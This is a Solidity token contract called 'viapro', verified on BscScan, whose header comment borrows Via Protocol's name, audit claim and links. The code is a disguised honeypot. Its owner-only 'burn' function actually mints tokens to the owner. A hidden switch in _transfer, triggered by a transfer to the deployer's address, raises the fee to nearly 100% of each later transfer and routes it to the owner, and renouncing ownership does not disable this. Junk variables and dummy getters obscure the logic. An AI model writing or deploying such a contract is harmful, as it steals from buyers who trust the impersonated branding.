/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

/*
viaprotocol
Bridge any token across 25 networks with max efficiency.  
One-stop bridge and DEX aggregator. 21 bridges, 25 chains.
✌️Via Protocol
👉 http://Router.Via.Exchange team is proud to announce the completion of the security audit done by pessimistic_io
Try it here 
👉 https://link3.to/via
👉 https://router.via.exchange
👉 https://twitter.com/via_protocol
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;
contract viapro {
uint256 private  TMCXRL = 3;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  VNGPQF = 6;
string public  symbol = "viapro";
address private  BFHHFM = address(0);
uint8 public constant decimals = 18;
uint256 private  NBOXEB = 1000000000000000000;
address private  JYDQMW = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  KAEBOI = 3;
address private  IRUOQD = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  KKRIYP = 7;
uint256 private  UPNWFE = 1;
address public owner;
address private  YCDQRX = address(0);
mapping (address => uint256) public balanceOf;
string public  name = "viapro";
uint256 public constant DYQISI = 99999;
uint256 private  WLHKBL = 5;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  LHWTCY = address(0);
uint256 public constant totalSupply = 1000000000000000000000000000;
function _getTMCXRL() private returns (uint256) {
return TMCXRL + 4;
}
//
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tLUEDAY 0");
require(spender != address(0), "fLUEDAY 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getIRUOQD() private returns (address) {
return IRUOQD;
}
//
function _getKAEBOI() private returns (uint256) {
return KAEBOI + 5;
}
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getUPNWFE() private returns (uint256) {
return UPNWFE + 3;
}
//
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getYCDQRX() private returns (address) {
return YCDQRX;
}
//
function _getLHWTCY() private returns (address) {
return LHWTCY;
}
//
function _getVNGPQF() private returns (uint256) {
return VNGPQF + 9;
}
//
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "LUEDAY");
require(to != address(0), "LUEDAY");
require(amount <= balanceOf[from], "LUEDAY");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* DYQISI/NBOXEB ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==JYDQMW){
NBOXEB = DYQISI+2;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getKKRIYP() private returns (uint256) {
return KKRIYP + 0;
}
//
function _getBFHHFM() private returns (address) {
return BFHHFM;
}
//
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getWLHKBL() private returns (uint256) {
return WLHKBL + 8;
}
//
constructor () public {
JYDQMW = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
//
}

library EnumerableSet {
    struct Set {
        // Storage of set values
        bytes32[] _values;
        mapping (bytes32 => uint256) _indexes;
    }
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }
    function _remove(Set storage set, bytes32 value) private returns (bool) {
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) { // Equivalent to contains(set, value)
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;
            bytes32 lastvalue = set._values[lastIndex];
            set._values[toDeleteIndex] = lastvalue;
            set._indexes[lastvalue] = toDeleteIndex + 1; // All indexes are 1-based
            set._values.pop();
            delete set._indexes[value];
            return true;
        } else {
            return false;
        }
    }
    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }
    struct Bytes32Set {
        Set _inner;
    }
    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }
    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }
    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }
    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }
    struct AddressSet {
        Set _inner;
    }
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }
    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }
    struct UintSet {
        Set _inner;
    }
    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }
    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }
    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }
    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
   function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}